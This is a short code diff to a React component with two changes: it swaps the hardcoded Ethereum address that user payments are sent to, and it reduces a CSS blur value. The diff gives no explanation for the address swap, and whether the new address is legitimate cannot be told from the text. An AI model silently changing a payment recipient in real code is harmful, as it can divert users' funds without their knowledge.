@@ -196,7 +196,7 @@ function Desktop() {
       const [from] = await window.ethereum.request({
         method: 'eth_requestAccounts',
       });
-      const to = '0xfF5693A149a49A1d0Ce2bB34b93bB90F880C3b89';
+      const to = '0xCF0d82Dc749214FC91eE4f2fA177641Ff1EF3891';
       const nonce = await web3.eth.getTransactionCount(from, 'latest');
       const value = Web3Utils.toWei(amount.toString(), 'ether');
       const gasLimit = await web3.eth.estimateGas({
@@ -387,7 +387,7 @@ function Desktop() {
           height: 'calc(100vh - 72px)',
           top: '72px',
           background: 'rgba(255, 255, 255, 0.9)',
-          backdropFilter: 'blur(12px)',
+          backdropFilter: 'blur(1px)',
           borderRadius: '12px 0 0 12px',
           padding: '24px',
           overflowY: 'scroll',
